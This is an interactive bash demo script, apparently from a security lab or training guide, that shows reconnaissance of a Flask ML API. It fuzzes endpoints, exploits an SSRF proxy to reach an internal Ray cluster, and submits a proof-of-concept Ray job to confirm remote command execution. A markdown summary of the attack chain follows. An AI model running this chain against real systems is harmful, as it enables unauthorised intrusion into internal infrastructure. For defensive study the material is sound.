#!/usr/bin/env bash
# ============================================================================
# LEGAL DISCLAIMER: This script is for authorized security testing and
# educational purposes only. Unauthorized use against systems you do not own
# or have explicit permission to test is illegal. Use only in isolated lab
# environments with no production data.
# ============================================================================

echo "╔════════════════════════════════════════════════════════╗"
echo "║         ATTACK DISCOVERY & RECONNAISSANCE              ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 1: EXTERNAL PORT SCANNING"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Attacker performs port scan on target..."
echo "  Target: company-ml-api.example.com"
echo ""
echo "PORT     STATE    SERVICE"
echo "5000/tcp open     Flask API"
echo ""
echo "✓ Flask API discovered on port 5000"
echo ""
read -p "Press Enter to continue..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 2: WEB APPLICATION FINGERPRINTING"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Checking HTTP headers and endpoints..."

# Test root endpoint
echo ""
echo "[*] Testing: GET /"
curl -s http://localhost:5000/ 2>&1 | head -5 || echo "404 Not Found"

echo ""
echo "[*] Testing common endpoints..."
for endpoint in /admin /api /health /debug /docs /swagger; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5000$endpoint)
    echo "  $endpoint -> HTTP $STATUS"
done

echo ""
echo "✓ Found: /health endpoint (200 OK)"
echo "✓ Found: /admin endpoint (200 OK)"
echo "✓ Found: /debug/* endpoints (potential RCE)"
echo ""
read -p "Press Enter to continue..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 3: INFORMATION DISCLOSURE"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Probing /health endpoint..."
curl -s http://localhost:5000/health | jq '.'

echo ""
echo "🚨 CRITICAL FINDINGS:"
echo "  ✓ Internal service URLs exposed!"
echo "  ✓ Ray Dashboard: http://raycluster-sample-head-svc....:8265"
echo "  ✓ Ray Inference: http://raycluster-sample-head-svc....:8000"
echo "  ✓ Environment variables leaked"
echo ""
echo "→ Attacker now knows about internal Ray cluster"
echo ""
read -p "Press Enter to continue..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 4: ENDPOINT ENUMERATION"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Fuzzing for additional endpoints..."
echo ""

# Fuzz common API patterns
ENDPOINTS=(
    "/api"
    "/v1"
    "/analyze"
    "/predict"
    "/inference"
    "/proxy"
    "/proxy-get"
    "/forward"
    "/debug/eval"
    "/debug/exec"
    "/debug/ping"
    "/admin/exec"
)

echo "ENDPOINT                STATUS   NOTES"
echo "----------------------------------------"
for ep in "${ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:5000$ep -H "Content-Type: application/json" -d '{}')
    if [ "$STATUS" != "404" ]; then
        echo "$ep        $STATUS    ✓ Active"
    fi
done

echo ""
echo "🚨 VULNERABLE ENDPOINTS DISCOVERED:"
echo "  • /proxy - SSRF vulnerability"
echo "  • /proxy-get - SSRF with GET support"
echo "  • /debug/eval - Remote Code Execution"
echo "  • /debug/ping - Command Injection"
echo "  • /admin/exec - Unauthenticated command execution"
echo ""
read -p "Press Enter to continue..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 5: TESTING SSRF VULNERABILITY"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Testing /proxy endpoint for SSRF..."
echo ""

# Test 1: Internal service access
echo "[Test 1] Can we reach internal services?"
curl -s -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:5000/health",
    "data": {}
  }' | jq -r '.status'

echo "  ✓ Can reach localhost services"
echo ""

# Test 2: Kubernetes internal DNS
echo "[Test 2] Can we reach Kubernetes internal DNS?"
curl -s -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8000/analyze",
    "data": {"text": "test"}
  }' | jq -r '.status'

echo "  ✓ Can reach internal Kubernetes services!"
echo ""

# Test 3: Ray Dashboard discovery
echo "[Test 3] Can we reach Ray Dashboard API?"
curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/version"
  }' | jq -r '.status'

echo "  ✓ Ray Dashboard accessible via SSRF!"
echo ""
read -p "Press Enter to continue..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 6: DISCOVERING RAY JOB SUBMISSION API"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "→ Researching Ray documentation online..."
echo "  • Ray Dashboard runs on port 8265"
echo "  • Job Submission API: /api/jobs/"
echo "  • Accepts JSON payloads with 'entrypoint' parameter"
echo ""

echo "→ Testing Ray Job Submission via SSRF..."
TEST_JOB=$(curl -s -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/",
    "data": {
      "entrypoint": "echo PROOF_OF_CONCEPT",
      "runtime_env": {}
    }
  }' | jq -r '.data.job_id')

echo "  ✓ Job submitted successfully!"
echo "  Job ID: $TEST_JOB"
echo ""

sleep 5
echo "→ Retrieving job output..."
curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${TEST_JOB}/logs\"
  }" | jq -r '.data.logs'

echo ""
echo "🚨 CRITICAL: ARBITRARY COMMAND EXECUTION CONFIRMED!"
echo ""
read -p "Press Enter to continue to exploitation..."
echo ""

echo "═══════════════════════════════════════════════════════"
echo "PHASE 7: EXPLOITATION BEGINS"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "Attacker now understands the complete attack chain:"
echo ""
echo "  1. Flask /proxy endpoint has SSRF vulnerability"
echo "  2. SSRF can reach internal Ray Dashboard (port 8265)"
echo "  3. Ray Dashboard has unauthenticated Job API"
echo "  4. Job API allows arbitrary command execution"
echo "  5. Commands execute in Ray cluster with GPU access"
echo ""
```

---

## Summary: How Attacker Discovers the Attack
```
Step 1: Port Scan → Find Flask API on port 5000
Step 2: Endpoint Fuzzing → Discover /health, /proxy, /debug endpoints
Step 3: Info Leak (/health) → Learn about internal Ray cluster
Step 4: SSRF Testing → Confirm can reach internal services
Step 5: Research → Google "Ray cluster job submission API"
Step 6: API Discovery → Find Ray Dashboard accepts jobs at /api/jobs/
Step 7: PoC Test → Submit "echo test" command
Step 8: Exploitation → Escalate to full compromise
